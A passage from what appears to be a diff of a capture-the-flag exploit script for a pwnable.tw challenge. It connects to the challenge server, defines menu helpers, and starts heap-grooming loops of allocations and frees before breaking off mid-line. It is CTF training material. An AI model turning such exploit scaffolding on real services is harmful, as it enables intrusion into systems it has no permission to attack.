import socket
+
+r = remote("chall.pwnable.tw", 10202)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("localhost", 18113))
+
+def add(x):
+    r.send("1\n")
+    r.recvuntil("u :")
+    r.send("%d\n" % x)
+    r.recvuntil("!\n")
+
+def dela():
+    r.send("4\n")
+    r.recvuntil("!\n")
+
+def att():
+    r.send("2\n")
+    x = r.recvline().strip()
+    r.recvuntil("!\n")
+    return x
+
+for i in range(10):
+    add(0x18) # 140
+
+for i in range(9):
+    dela()
+
+for i in range(20):
+    add(0x18
